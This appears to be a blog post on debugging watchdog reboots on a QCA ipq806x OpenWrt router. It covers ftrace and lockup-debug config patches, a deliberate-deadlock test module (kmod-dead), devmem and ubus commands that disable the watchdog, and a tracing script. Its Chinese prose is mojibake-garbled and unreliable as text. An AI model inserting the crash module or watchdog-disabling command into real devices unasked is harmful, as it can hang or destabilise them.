<p>ä½†æ˜¯æ— æ³•ç¡®å®šæ ¹æœ¬åŸå› æ˜¯ä»€ä¹ˆï¼Œæ˜¯ä»€ä¹ˆå¯¼è‡´çš„æ­»é”ï¼Œè®©watchdogæ²¡åŠæ³•åœ¨è§„å®šæ—¶é—´å†…barkã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬éœ€è¦å¯ç”¨ç›¸å…³çš„å†…æ ¸è°ƒè¯•æ‰‹æ®µå»è·å–ç›¸å…³ä¿¡æ¯ï¼Œç„¶åæ·±å…¥åˆ†æcrashdumpå’Œconsole logã€‚</p>
<h2 id="å†…æ ¸è£å‰ª"><a href="#å†…æ ¸è£å‰ª" class="headerlink" title="å†…æ ¸è£å‰ª"></a>å†…æ ¸è£å‰ª</h2><h3 id="å¯ç”¨ftrace"><a href="#å¯ç”¨ftrace" class="headerlink" title="å¯ç”¨ftrace"></a>å¯ç”¨ftrace</h3><blockquote>
<p><strong>Ftrace</strong> is an internal tracer designed to help out developers and designers of systems to find what is going on inside the kernel. It can be used for debugging or analyzing latencies and performance issues that take place outside of user-space.</p>
</blockquote>
<p><code>Ftrace</code>æ˜¯ä¸€ä¸ªå†…éƒ¨è·Ÿè¸ªå™¨ï¼Œç”¨äºè¿½è¸ªå†…æ ¸è¿è¡Œæƒ…å†µï¼Œå¸®åŠ©è°ƒè¯•ç”¨æˆ·ç©ºé—´ä¹‹å¤–çš„æ½œåœ¨é—®é¢˜æˆ–æ€§èƒ½é—®é¢˜ã€‚æ ¹æ®QCAæä¾›çš„å¸®åŠ©æ–‡æ¡£ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹æ­¥éª¤å¼€å¯ftraceåŠŸèƒ½ã€‚</p>
<ol>
<li>From &quot;make menuconfig&quot;, go to --&gt; &quot;Global Build Settings&quot; then go to --&gt; &quot;Compile kernel with tracing support&quot;</li>
<li>In the &quot;Compile kernel with tracing support&quot;, enable the below options :-<ul>
<li>Enable/disable function tracing dynamically</li>
<li>Trace process context switches and events</li>
<li>Function tracer</li>
</ul>
</li>
<li>Once above changes are done, then from the &quot;make kernel_menuconfig&quot;, go to --&gt; &quot;Kernel hacking&quot; --&gt; then enable the below options in &quot;Tracers&quot;:-<ul>
<li>Kernel Function Tracer</li>
<li>enable/disable function tracing dynamically</li>
</ul>
</li>
</ol>
<p>å¯ä»¥çœ‹å‡ºï¼Œé…ç½®åˆ†ä¸¤ä¸ªéƒ¨åˆ†å®Œæˆï¼Œ<code>make menuconfig</code>åŠ<code>make kernel_menuconfig</code></p>
<p><img src="/assets/kernel/menuconfig_ftrace.png" alt="make menuconfig"></p>
<p>ä½¿ç”¨å›¾å½¢åŒ–ç•Œé¢é…ç½®menuconfigå¦‚ä¸Šï¼Œä¿å­˜åå¯¹åº”çš„.configæ–‡ä»¶ä¼šéšä¹‹æ›´æ”¹</p>
<pre><code class="patch"> # CONFIG_KERNEL_PROFILIING is not set
 CONFIG_KERNEL_KALLSYMS=y
 # CONFIG_KERNEL_KALLSYMS_ALL is not set
-# CONFIG_KERNEL_FTRACE is not set
+CONFIG_KERNEL_FTRACE=y
+# CONFIG_KERNEL_FTRACE_SYSCALLS is not set
+CONFIG_KERNEL_ENABLE_DEFAULT_TRACERS=y
 # CONFIG_KERNEL_DEBUG_KMEMLEAK is not set
+CONFIG_KERNEL_FUNCTION_TRACER=y
+# CONFIG_KERNEL_FUNCTION_GRAPH_TRACER is not set
+CONFIG_KERNEL_DYNAMIC_FTRACE=y
+# CONFIG_KERNEL_FUNCTION_PROFILER is not set
 # CONFIG_KERNEL_IRQSOFF_TRACER is not set
 # CONFIG_KERNEL_PREEMPT_TRACER is not set
 CONFIG_KERNEL_DEBUG_KERNEL=y
</code></pre>
<p>ä½†æ˜¯åœ¨<code>openWrt</code>ä¸­ä½¿ç”¨<code>make kernel_menuconfig</code>ä¼šæ‰“ä¹±åŸæœ‰çš„é…ç½®é€‰é¡¹ï¼Œæ‰€ä»¥éœ€è¦æ‰‹åŠ¨ä¿®æ”¹é…ç½®æ–‡ä»¶</p>
<pre><code class="patch">@@ -3301,8 +3304,26 @@ CONFIG_HAVE_FTRACE_MCOUNT_RECORD=y
 CONFIG_HAVE_SYSCALL_TRACEPOINTS=y
 CONFIG_HAVE_C_RECORDMCOUNT=y
 CONFIG_TRACING_SUPPORT=y
-# CONFIG_FTRACE is not set
-
+CONFIG_FTRACE=y
+CONFIG_FUNCTION_TRACER=y
+CONFIG_DYNAMIC_FTRACE=y
+# CONFIG_NET_DROP_MONITOR is not set
+# CONFIG_FUNCTION_GRAPH_TRACER is not set
+# CONFIG_IRQSOFF_TRACER is not set
+# CONFIG_PREEMPT_TRACER is not set
+# CONFIG_SCHED_TRACER is not set
+# CONFIG_FTRACE_SYSCALLS is not set
+# CONFIG_TRACER_SNAPSHOT is not set
+CONFIG_BRANCH_PROFILE_NONE=y
+# CONFIG_PROFILE_ANNOTATED_BRANCHES is not set
+# CONFIG_PROFILE_ALL_BRANCHES is not set
+# CONFIG_STACK_TRACER is not set
+# CONFIG_BLK_DEV_IO_TRACE is not set
+# CONFIG_FUNCTION_PROFILER is not set
+# CONFIG_FTRACE_STARTUP_TEST is not set
+# CONFIG_RING_BUFFER_STARTUP_TEST is not set
+# CONFIG_RING_BUFFER_BENCHMARK is not set
+#
 #
 # Runtime Testing
 #
</code></pre>
<p>å¯¹åº”çš„å›¾å½¢åŒ–é…ç½®å¦‚ä¸‹ï¼š</p>
<p><img src="/assets/kernel/kernel_menuconfig_ftrace.png" alt="kernel_menuconfig ftrace"></p>
<h3 id="å¯ç”¨lockup-debug"><a href="#å¯ç”¨lockup-debug" class="headerlink" title="å¯ç”¨lockup debug"></a>å¯ç”¨lockup debug</h3><p>ä¸ºäº†æ‰“å°å‡ºç°æ­»é”åçš„ç›¸å…³ä¿¡æ¯ï¼Œéœ€è¦æ‰“å¼€ç›¸åº”çš„é…ç½®å‚æ•°</p>
<pre><code class="patch">@@ -3249,9 +3249,9 @@ CONFIG_HAVE_DEBUG_KMEMLEAK=y
 # Debug Lockups and Hangs
 #
 CONFIG_LOCKUP_DETECTOR=y
-# CONFIG_BOOTPARAM_SOFTLOCKUP_PANIC is not set
+CONFIG_BOOTPARAM_SOFTLOCKUP_PANIC=y
 CONFIG_BOOTPARAM_SOFTLOCKUP_PANIC_VALUE=0
-# CONFIG_DETECT_HUNG_TASK is not set
+CONFIG_DETECT_HUNG_TASK=y
 # CONFIG_PANIC_ON_OOPS is not set
 CONFIG_PANIC_ON_OOPS_VALUE=0
 CONFIG_PANIC_TIMEOUT=3
@@ -3259,20 +3259,21 @@ CONFIG_PANIC_TIMEOUT=3
 # CONFIG_SCHEDSTATS is not set
 # CONFIG_TIMER_STATS is not set
 # CONFIG_DEBUG_PREEMPT is not set
-
+CONFIG_DEFAULT_HUNG_TASK_TIMEOUT=120
+CONFIG_BOOTPARAM_HUNG_TASK_PANIC=y
 #
 # Lock Debugging (spinlocks, mutexes, etc...)
 #
-# CONFIG_DEBUG_RT_MUTEXES is not set
-# CONFIG_RT_MUTEX_TESTER is not set
-# CONFIG_DEBUG_SPINLOCK is not set
-# CONFIG_DEBUG_MUTEXES is not set
-# CONFIG_DEBUG_WW_MUTEX_SLOWPATH is not set
-# CONFIG_DEBUG_LOCK_ALLOC is not set
-# CONFIG_PROVE_LOCKING is not set
-# CONFIG_LOCK_STAT is not set
-# CONFIG_DEBUG_ATOMIC_SLEEP is not set
-# CONFIG_DEBUG_LOCKING_API_SELFTESTS is not set
+CONFIG_DEBUG_RT_MUTEXES=y
+CONFIG_RT_MUTEX_TESTER=y
+CONFIG_DEBUG_SPINLOCK=y
+CONFIG_DEBUG_MUTEXES=y
+CONFIG_DEBUG_WW_MUTEX_SLOWPATH=y
+CONFIG_DEBUG_LOCK_ALLOC=y
+CONFIG_PROVE_LOCKING=y
+CONFIG_LOCK_STAT=y
+CONFIG_DEBUG_ATOMIC_SLEEP=y
+CONFIG_DEBUG_LOCKING_API_SELFTESTS=y
 # CONFIG_DEBUG_KOBJECT is not set
 CONFIG_DEBUG_BUGVERBOSE=y
 # CONFIG_DEBUG_WRITECOUNT is not set
@@ -3280,6 +3281,8 @@ CONFIG_DEBUG_BUGVERBOSE=y
 # CONFIG_DEBUG_SG is not set
 # CONFIG_DEBUG_NOTIFIERS is not set
 # CONFIG_DEBUG_CREDENTIALS is not set
+CONFIG_DEBUG_LOCKDEP=y
+# CONFIG_PROVE_RCU is not set
</code></pre>
<p>å…¶ä¸­æœ‰äº›çœ‹ä¼¼ä¸ç›¸å¹²çš„configï¼ˆå¦‚<code>CONFIG_PROVE_RCU</code>ï¼‰è¢«è®¾ç½®æˆäº†<code>is not set</code>ï¼Œè¿™æ˜¯å’ŒæŸäº›lockupé…ç½®ç›¸å…³çš„ä¾èµ–å…³ç³»å†³å®šçš„ï¼Œå¦‚æœæ²¡æœ‰æ˜¾å¼è®¾ç½®çš„è¯ï¼Œæ¯æ¬¡ç¼–è¯‘éƒ½ä¼šè®©ä½ æ‰‹åŠ¨é€‰æ‹©æ˜¯å¦å¯ç”¨ã€‚å¦‚æœä½¿ç”¨ä¸‹é¢çš„å›¾å½¢åŒ–ç•Œé¢é…ç½®å°±ä¸éœ€è¦æ‰‹åŠ¨æ·»åŠ äº†ï¼Œå› ä¸ºå®ƒä¼šè‡ªåŠ¨å¤„ç†å„ç§ä¾èµ–å…³ç³»ã€‚</p>
<p><img src="/assets/kernel/kernel_menuconfig_lockup.png" alt="kernel_menuconfig lockup"></p>
<h3 id="ç§»é™¤æœªä½¿ç”¨çš„å†…æ ¸æ¨¡å—"><a href="#ç§»é™¤æœªä½¿ç”¨çš„å†…æ ¸æ¨¡å—" class="headerlink" title="ç§»é™¤æœªä½¿ç”¨çš„å†…æ ¸æ¨¡å—"></a>ç§»é™¤æœªä½¿ç”¨çš„å†…æ ¸æ¨¡å—</h3><p>ç”±äºå¯ç”¨äº†å¤§é‡çš„è°ƒè¯•ä¿¡æ¯ï¼Œå¼€æœºå¯åŠ¨æ— çº¿æ¨¡å—æ—¶ä¼šæç¤ºå†…å­˜ä¸è¶³çš„æƒ…å†µï¼Œä»è€Œå¯¼è‡´æ— çº¿æ¨¡å—æ— æ³•å·¥ä½œã€‚</p>
<pre><code class="log">ath_dev: Copyright (c) 2001-2007 Atheros Communications, Inc, All Rights Reserved
ath_da_pci:  (Atheros/multi-bss)
DHCPv6 client is not running! Return
vmap allocation for size 1064960 failed: use vmalloc=&lt;size&gt; to increase size.
vmalloc: allocation failure: 1060629 bytes
insmod: page allocation failure: order:0, mode:0xd0
......
ath_dev: driver unloaded
ath_tx99: driver unloaded
ath_rate_atheros: driver unloaded
ath_hal: driver unloaded
ath_spectral: driver unloaded
ath_dfs: driver unloaded
phy for wifi device wifi0 not found
wifi0(qcawifi): enable failed
qcawifi: enable radio wifi1
</code></pre>
<p>ä¸ºæ­¤å¯ä»¥å°†éƒ¨åˆ†æœªä½¿ç”¨çš„å†…æ ¸æ¨¡å—ç§»é™¤ã€‚</p>
<ol>
<li>Bluetooth driver</li>
<li>SOUND driver</li>
<li>IDE &amp; SCSI driver</li>
<li>Filesystems not used</li>
</ol>
<p>å¯ä»¥é€šè¿‡ç›´æ¥ä¿®æ”¹å†…æ ¸é…ç½®æ–‡ä»¶<code>target/linux/ipq806x/config_dni-3.14</code>å®Œæˆè£å‰ªã€‚</p>
<h2 id="æ·»åŠ å†…æ ¸æµ‹è¯•æ¨¡å—-kmod-dead"><a href="#æ·»åŠ å†…æ ¸æµ‹è¯•æ¨¡å—-kmod-dead" class="headerlink" title="æ·»åŠ å†…æ ¸æµ‹è¯•æ¨¡å— kmod-dead"></a>æ·»åŠ å†…æ ¸æµ‹è¯•æ¨¡å— kmod-dead</h2><p>QCAä¸ºäº†æµ‹è¯•<code>watchdog</code>é—®é¢˜ï¼Œæä¾›äº†ä¸€ä¸ªå†…æ ¸æµ‹è¯•æ¨¡å—ï¼Œé€šè¿‡è¯¥æ¨¡å—å¯ä»¥æ‰‹åŠ¨è§¦å‘ç³»ç»Ÿcrash</p>
<p><code>kmod-dead</code>çš„ç›®å½•ç»“æ„å¦‚ä¸‹ï¼š</p>
<pre><code class="sh">kmod-dead
â”œâ”€â”€ Makefile
â””â”€â”€ src
    â”œâ”€â”€ dead.c
    â”œâ”€â”€ Kconfig
    â””â”€â”€ Makefile
</code></pre>
<h3 id="Makefile"><a href="#Makefile" class="headerlink" title="Makefile"></a>Makefile</h3><p>æ¨¡å—æ ¹ç›®å½•çš„Makefileä»¿å…¶å®ƒå†…æ ¸æ¨¡å—(<code>kmod-urlblock</code>)ç¼–å†™</p>
<pre><code class="Makefile">include $(TOPDIR)/rules.mk
include $(INCLUDE_DIR)/kernel.mk

PKG_RELEASE:=1
PKG_NAME:=kmod-dead

PKG_BUILD_DIR:=$(KERNEL_BUILD_DIR)/$(PKG_NAME)

include $(INCLUDE_DIR)/package.mk

define KernelPackage/dead
  SUBMENU:=Other modules
  TITLE:=kernel dead
  VERSION:=$(LINUX_VERSION)-$(BOARD)-$(PKG_RELEASE)
  FILES:= $(PKG_BUILD_DIR)/dead.$(LINUX_KMOD_SUFFIX)
# AUTOLOAD:=$(call AutoLoad,46,dead)
endef

define Build/Prepare
    mkdir -p $(PKG_BUILD_DIR)
    $(CP) ./src/* $(PKG_BUILD_DIR)
endef

define Build/Compile
    $(MAKE) -C &quot;$(LINUX_DIR)&quot; \
        CROSS_COMPILE=&quot;$(TARGET_CROSS)&quot; \
        ARCH=&quot;$(LINUX_KARCH)&quot; \
        SUBDIRS=&quot;$(PKG_BUILD_DIR)&quot; \
        EXTRA_CFLAGS=&quot;$(BUILDFLAGS)&quot; \
        modules
endef

define KernelPackage/dead/install
    $(INSTALL_DIR) $(1)/lib/network/
endef

$(eval $(call KernelPackage,dead))
</code></pre>
<p>Makefileä¸­å°†<code>AUTOLOAD</code>æ‰€åœ¨è¡Œæ³¨é‡Šæ‰æ˜¯ä¸ºäº†ç¦æ­¢æ¨¡å—è‡ªåŠ¨åŠ è½½ï¼Œå¯¼è‡´ç³»ç»Ÿåˆšåˆšå¯åŠ¨å°±crashï¼Œç„¶åæ— é™é‡å¯ã€‚</p>
<h3 id="src-dead-c"><a href="#src-dead-c" class="headerlink" title="src/dead.c"></a>src/dead.c</h3><pre><code class="c">#include &lt;linux/kernel.h&gt;
#include &lt;linux/init.h&gt;
#include &lt;linux/module.h&gt;
#include &lt;linux/kthread.h&gt;
#include &lt;linux/spinlock_types.h&gt;

static DEFINE_SPINLOCK(test_lock);

static int process_test(void *info)
{
    spin_lock(&amp;test_lock);
    while(1);
    return 0;
}

static int __init init_3mb_alloc(void)
{
    struct task_struct *p1, *p2, *p3, *p4;
    printk(&quot;MODULE\tINITIALIZED\n&quot;);

    p1 = kthread_create(process_test, NULL, &quot;TEST_CPU_1_THREAD&quot;);
    kthread_bind(p1,0);

    p2 = kthread_create(process_test, NULL, &quot;TEST_CPU_2_THREAD&quot;);
    kthread_bind(p2,0);

    p3 = kthread_create(process_test, NULL, &quot;TEST_CPU_3_THREAD&quot;);
    kthread_bind(p3,0);

    p4 = kthread_create(process_test, NULL, &quot;TEST_CPU_4_THREAD&quot;);
    kthread_bind(p4,0);

    wake_up_process(p1);
    wake_up_process(p2);
    wake_up_process(p3);
    wake_up_process(p4);

    return 0;
}

static void __exit exit_3mb_alloc(void)
{
    printk(&quot;MODULE\tTERMINATED\n&quot;);
}

module_init(init_3mb_alloc);
module_exit(exit_3mb_alloc);

MODULE_LICENSE(&quot;GPL&quot;);
MODULE_AUTHOR(&quot;QUALCOMM&quot;);
</code></pre>
<h3 id="src-Makefile"><a href="#src-Makefile" class="headerlink" title="src/Makefile"></a>src/Makefile</h3><pre><code class="Makefile"># This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version
# 2 of the License, or (at your option) any later version.

obj-m := dead.o

ifeq ($(MAKING_MODULES),1)

-include $(TOPDIR)/Rules.make
endif
</code></pre>
<h3 id="src-Kconfig"><a href="#src-Kconfig" class="headerlink" title="src/Kconfig"></a>src/Kconfig</h3><pre><code class="yml">config DEAD
    tristate &quot;This is a Module_DEAD&quot;
    default y
    help
        This is a dead module, for debugging kernel crash.
        If unsure, say N.
</code></pre>
<h2 id="æ‰“å°watchdog-pingç›¸å…³log"><a href="#æ‰“å°watchdog-pingç›¸å…³log" class="headerlink" title="æ‰“å°watchdog pingç›¸å…³log"></a>æ‰“å°watchdog pingç›¸å…³log</h2><p>ç¼–è¾‘ä»¥ä¸‹æ–‡ä»¶ï¼Œåœ¨watchdogæ‰§è¡Œpingæ“ä½œæ—¶æ‰“å°log</p>
<p>build_dir/target-arm_cortex-a7_uClibc-1.0.14_eabi/linux-ipq806x/linux-3.14.77/drivers/watchdog/qcom-wdt.c</p>
<pre><code class="c">static int qcom_wdt_ping(struct watchdog_device *wdd)
{
    struct qcom_wdt *wdt = to_qcom_wdt(wdd);

    printk(&quot;********************qcom-wdt-ping1*****************\n&quot;);
    writel(1, wdt-&gt;wdt_reset);
    printk(&quot;********************qcom-wdt-ping2*****************\n&quot;);
    return 0;
}
</code></pre>
<p>ä»¥ä¸Š<code>printk</code>éƒ¨åˆ†å°±æ˜¯æ‰“å°çš„logã€‚æ®æ­¤å¯ä»¥ç”Ÿæˆkernel patchå¦‚ä¸‹ï¼š</p>
<blockquote>
<p>å¾…ä¿®æ”¹æ–‡ä»¶ï¼šlinux-3.14.77/drivers/watchdog/qcom-wdt.c<br>è·¯å¾„ï¼štarget/linux/ipq806x/patches_dni-3.14<br>patchï¼š0101-print-watch-ping-log.patch</p>
</blockquote>
<pre><code class="patch">--- linux-3.14.77.orig/drivers/watchdog/qcom-wdt.c 2019-11-01 10:0:18.332348721 +0800
+++ linux-3.14.77/drivers/watchdog/qcom-wdt.c 2019-11-01 09:39:58.689575974 +0800
@@ -253,7 +253,9 @@
 {
     struct qcom_wdt *wdt = to_qcom_wdt(wdd);

+    printk(&quot;********************qcom-wdt-ping1*****************\n&quot;);
     writel(1, wdt-&gt;wdt_reset);
+    printk(&quot;********************qcom-wdt-ping2*****************\n&quot;);
     return 0;
 }
</code></pre>
<h2 id="æ‰“å¼€DTS-debug"><a href="#æ‰“å¼€DTS-debug" class="headerlink" title="æ‰“å¼€DTS debug"></a>æ‰“å¼€DTS debug</h2><p>ç¼–è¾‘dtsï¼ˆDevice Tree Sourceï¼‰çš„é…ç½®æ–‡ä»¶ï¼Œä½¿èƒ½<code>init_debug</code></p>
<blockquote>
<p>å¾…ä¿®æ”¹æ–‡ä»¶ï¼šlinux-3.14.77/arch/arm/boot/dts/qcom-ipq40xx-ap.dj04.1.dtsi<br>è·¯å¾„ï¼štarget/linux/ipq806x/patches_dni-3.14<br>patchï¼š0102-add-init_debug=4-in-dts.patch</p>
</blockquote>
<pre><code class="patch">--- linux-3.14.77.orig/arch/arm/boot/dts/qcom-ipq4xx-ap.dk04.1.dtsi 2019-11-01 16:07:53.063327477 +0800
+++ linux-3.14.77/arch/arm/boot/dts/qcom-ipq4xx-ap.dk04.1.dtsi 2019-11-01 14:05:33.923495413 +0800
@@ -50,7 +50,7 @@
+       };
+
+       chosen {
+-              bootargs-append = &quot; clk_ignore_unused user_debug=0xff&quot;;
++              bootargs-append = &quot; clk_ignore_unused user_debug=0xff init_debug=4&quot;;
+       };
+
+ };
</code></pre>
<p><code>init_debug</code>ç”¨äºæ‰“å¼€è°ƒè¯•logï¼Œä¸Šé¢çš„patchå¯¹åº”ä¿®æ”¹çš„ç³»ç»Ÿæ–‡ä»¶æ˜¯<code>/proc/cmdline</code></p>
<pre><code class="sh">$ cat /proc/cmdline
 rootwait clk_ignore_unused user_debug=0xff init_debug=4
</code></pre>
<h2 id="ä¿®æ”¹kernel-size-amp-rootfs-size"><a href="#ä¿®æ”¹kernel-size-amp-rootfs-size" class="headerlink" title="ä¿®æ”¹kernel_size &amp; rootfs_size"></a>ä¿®æ”¹kernel_size &amp; rootfs_size</h2><p>ä½¿èƒ½å¤§é‡debugä¿¡æ¯ä¼šå¯¼è‡´kernel sizeå¢å¤§ï¼Œæ‰€ä»¥éœ€è¦ä¿®æ­£kernel size.</p>
<h3 id="è®¡ç®—"><a href="#è®¡ç®—" class="headerlink" title="è®¡ç®—"></a>è®¡ç®—</h3><p>kernelçš„å¤§å°å¯ä»¥ä»ä»¥ä¸‹æ–‡ä»¶è·å–ã€‚</p>
<pre><code class="sh">$ ls -l bin/ipq806x/openwrt-ipq806x-qcom-ipq40xx-ap.dkxx-fit-uImage.itb
-rw-r--r-- 1 guangtao.wu guangtao.wu 4364244 Oct 31 16:06 bin/ipq806x/openwrt-ipq806x-qcom-ipq40xx-ap.dkxx-fit-uImage.itb
</code></pre>
<p>ç”±äºflashéœ€è¦128kå¯¹é½ï¼Œæ‰€ä»¥<code>kernel size</code>éœ€è¦é€šè¿‡ä»¥ä¸Šæ–‡ä»¶å¤§å°<code>4364244</code>é™¤ä»¥128kå†å–æ•´åé‡æ–°è®¡ç®—</p>
<pre><code class="c">4364244 / ( 128 * 1024 ) = 33.2965

# kernel size
34 * 128 * 1024 = 4456448 = 0x440000

# rootfs size
0x2800000 - 0x440000 = 0x23c0000
</code></pre>
<h3 id="ä¿®æ”¹dni-home-config-defconfig-orbi"><a href="#ä¿®æ”¹dni-home-config-defconfig-orbi" class="headerlink" title="ä¿®æ”¹dni_home config/defconfig-orbi"></a>ä¿®æ”¹dni_home config/defconfig-orbi</h3><pre><code class="txt">CONFIG_DGC_FW_KERNEL_SIZE=&quot;4456448&quot;
CONFIG_DGC_FW_ROOTFS_SIZE=&quot;37486592&quot;
CONFIG_DGC_FW_KERNEL_SIZE_CC=&quot;4456448&quot;
CONFIG_DGC_FW_ROOTFS_SIZE_CC=&quot;37486592&quot;
</code></pre>
<h3 id="ä¿®æ”¹kernel-patch"><a href="#ä¿®æ”¹kernel-patch" class="headerlink" title="ä¿®æ”¹kernel patch"></a>ä¿®æ”¹kernel patch</h3><p>patch: kernel/patches_dni/0012-fix-issue-after-disable-usb-rootfs-checksum-error.patch</p>
<pre><code class="patch">      { 0x0a600000, 0x02800000, &quot;firmware&quot; },
 -    { 0x0a600000, 0x003c0000, &quot;kernel&quot; },
 -    { 0x0a9c0000, 0x02440000, &quot;rootfs&quot; },
-+    { 0x0a600000, 0x003c0000, &quot;kernel&quot; },
-+    { 0x0a9c0000, 0x02440000, &quot;rootfs&quot; },
++    { 0x0a600000, 0x00440000, &quot;kernel&quot; },
++    { 0x0aa40000, 0x023c0000, &quot;rootfs&quot; },
      { 0x0ce00000, 0x03200000, &quot;reserved&quot; },
</code></pre>
<h2 id="watchdogç›¸å…³æŒ‡ä»¤"><a href="#watchdogç›¸å…³æŒ‡ä»¤" class="headerlink" title="watchdogç›¸å…³æŒ‡ä»¤"></a>watchdogç›¸å…³æŒ‡ä»¤</h2><h3 id="ç¦ç”¨watchdogçš„ç¡¬ä»¶é‡å¯åŠŸèƒ½"><a href="#ç¦ç”¨watchdogçš„ç¡¬ä»¶é‡å¯åŠŸèƒ½" class="headerlink" title="ç¦ç”¨watchdogçš„ç¡¬ä»¶é‡å¯åŠŸèƒ½"></a>ç¦ç”¨watchdogçš„ç¡¬ä»¶é‡å¯åŠŸèƒ½</h3><pre><code class="sh">devmem 0x0B017008 w 0x0
</code></pre>
<p>è¯´æ˜ï¼šç¦ç”¨watchdogçš„ç¡¬ä»¶é‡å¯åŠŸèƒ½å¯ä»¥é˜²æ­¢kernel crashåè‡ªåŠ¨é‡å¯ï¼Œé…åˆftraceåŠå…¶å®ƒè°ƒè¯•ä¿¡æ¯èƒ½æ–¹ä¾¿åˆ†æé—®é¢˜ã€‚</p>
<h3 id="watchdogè½¯ä»¶æ§åˆ¶æŒ‡ä»¤"><a href="#watchdogè½¯ä»¶æ§åˆ¶æŒ‡ä»¤" class="headerlink" title="watchdogè½¯ä»¶æ§åˆ¶æŒ‡ä»¤"></a>watchdogè½¯ä»¶æ§åˆ¶æŒ‡ä»¤</h3><pre><code class="sh"># To query watchdog status
ubus call system watchdog

# To stop watchdog
ubus call system watchdog &#39;{&quot;stop&quot;: true}&#39;

# To start watchdog
ubus call system watchdog &#39;{&quot;stop&quot;: false}&#39;

# To configure watchdog timeout as 20 seconds (default is 30 seconds)
ubus call system watchdog &#39;{&quot;timeout&quot;: 20}&#39;
</code></pre>
<p>è¯´æ˜ï¼šåœ¨æ²¡æœ‰ç¦ç”¨watchdogç¡¬ä»¶åŠŸèƒ½æ—¶ï¼Œå¦‚æœä½¿ç”¨<code>ubus</code>åœæ­¢<code>watchdog</code>ï¼Œç³»ç»Ÿä¼šåœ¨è®¾å®šçš„è¶…æ—¶æ—¶é—´(é»˜è®¤30s)åè‡ªåŠ¨é‡å¯ã€‚</p>
<h2 id="æµ‹è¯•è„šæœ¬"><a href="#æµ‹è¯•è„šæœ¬" class="headerlink" title="æµ‹è¯•è„šæœ¬"></a>æµ‹è¯•è„šæœ¬</h2><p>å¯ç”¨<code>ftrace</code>è°ƒè¯•åŠŸèƒ½é™¤äº†éœ€è¦ä¿®æ”¹é…ç½®æ–‡ä»¶å¤–ï¼Œè¿˜è¦å¯¹<code>/sys/kernel/debug/tracing/</code>ç›®å½•çš„æ–‡ä»¶è¿›è¡Œç›¸å…³ä¿®æ”¹æ‰èƒ½ç”Ÿæ•ˆã€‚ä¸‹é¢æ˜¯åœ¨æµ‹è¯•trial FWæ—¶ç”¨åˆ°çš„æµ‹è¯•è„šæœ¬ï¼Œç”¨äºè·å–å¿…è¦çš„è°ƒè¯•ä¿¡æ¯ã€‚</p>
<pre><code class="sh">#!/bin/sh
# use for watchdog cause reboot issue

#********************************************#
# watchdog settings
#********************************************#
# disable the APCS_KPSS watchdog
devmem 0x0B017008 w 0x0

# check watchdog status
ubus call system watchdog

# other related commands
#   ubus call system watchdog &#39;{&quot;stop&quot;: true}&#39;
#   ubus call system watchdog &#39;{&quot;stop&quot;: false}&#39;
#   ubus call system watchdog &#39;{&quot;timeout&quot;: 20}&#39;

#********************************************#
# enable ftrace
#********************************************#
# To enable function tracing during run time
echo 0 &gt; /sys/kernel/debug/tracing/tracing_on
echo function &gt; /sys/kernel/debug/tracing/current_tracer
echo 1 &gt; /sys/kernel/debug/tracing/tracing_on

# To enable specific events to be traced
echo tlet_entry &gt;&gt; /sys/kernel/debug/tracing/set_event
echo tlet_exit &gt;&gt; /sys/kernel/debug/tracing/set_event
echo irq_handler_entry &gt;&gt; /sys/kernel/debug/tracing/set_event
echo irq_handler_exit &gt;&gt; /sys/kernel/debug/tracing/set_event
echo softirq_entry &gt;&gt; /sys/kernel/debug/tracing/set_event
echo softirq_exit &gt;&gt; /sys/kernel/debug/tracing/set_event
echo timer_expire_entry &gt;&gt; /sys/kernel/debug/tracing/set_event
echo timer_expire_exit &gt;&gt; /sys/kernel/debug/tracing/set_event
echo sched_switch &gt;&gt; /sys/kernel/debug/tracing/set_event

# To Dump the FTrace to the console in case of oops
echo 1 &gt; /proc/sys/kernel/ftrace_dump_on_oops

# To increase the size of Ftrace buffer per CPU
echo 2048 &gt; /sys/kernel/debug/tracing/buffer_size_kb

# To enable tracing of signals
echo SyS_reboot:dump &gt; /sys/kernel/debug/tracing/set_ftrace_filter
echo 1 &gt; /sys/kernel/debug/tracing/events/signal/enable
echo 1 &gt; /sys/kernel/debug/tracing/tracing_on
sysctl -w kernel.ftrace_dump_on_oops=1


#********************************************#
# loop to cat memory info and process info
#********************************************#
while true
do
    free
    ps ww
    cat /proc/meminfo
    cat /proc/slabinfo
    ubus call system watchdog
    sleep 300
done
</code></pre>
<h2 id="å‚è€ƒæ–‡çŒ®"><a href="#å‚è€ƒæ–‡çŒ®" class="headerlink" title="å‚è€ƒæ–‡çŒ®"></a>å‚è€ƒæ–‡çŒ®</h2><ul>
<li><a href="https://www.kernel.org/doc/Documentation/trace/ftrace.txt" target="_blank" rel="noopener">ftrace - Function Tracer</a></li>
</ul>
<h2 id="2020-01-14-æ›´æ–°"><a href="#2020-01-14-æ›´æ–°" class="headerlink" title="2020.01.14 æ›´æ–°"></a>2020.01.14 æ›´æ–°</h2><p>åœ¨ä¸€ä¸ªæ–°é¡¹ç›®ä¸­åˆå‡ºç°äº†watchdog biteå¯¼è‡´ç³»ç»Ÿé‡å¯çš„é—®é¢˜ï¼Œè€Œä¸”é‡ç°æ¦‚ç‡å¾ˆé«˜ï¼Œæ‰€ä»¥åˆå¼€å§‹äº†æ–°ä¸€è½®çš„debug</p>
<h3 id="é‡ç°æ­¥éª¤"><a href="#é‡ç°æ­¥éª¤" class="headerlink" title="é‡ç°æ­¥éª¤"></a>é‡ç°æ­¥éª¤</h3><p>æ ¹æ®SQAæä¾›çš„é‡ç°æ­¥éª¤ï¼Œç»è¿‡å¤šæ¬¡æµ‹è¯•åç®€åŒ–å¦‚ä¸‹ï¼ŒæŒ‰æ­¤æ­¥éª¤å¯ä»¥100%é‡ç°é—®é¢˜</p>
<ol>
<li>é‡ç½®è·¯ç”±å™¨</li>
<li>é‡æ–°é…ç½®è·¯ç”±å™¨</li>
<li>ä½¿èƒ½block siteåŠŸèƒ½ï¼Œæ·»åŠ å…³é”®è¯ï¼Œæ¯”å¦‚yam</li>
<li>ä½¿èƒ½EmailåŠŸèƒ½ï¼Œæ·»åŠ gmailé‚®ç®±ï¼Œå½“ç”¨æˆ·è®¿é—®blocked siteæ—¶è‡ªåŠ¨å‘é€mail</li>
<li>è®¿é—®block site</li>
</ol>
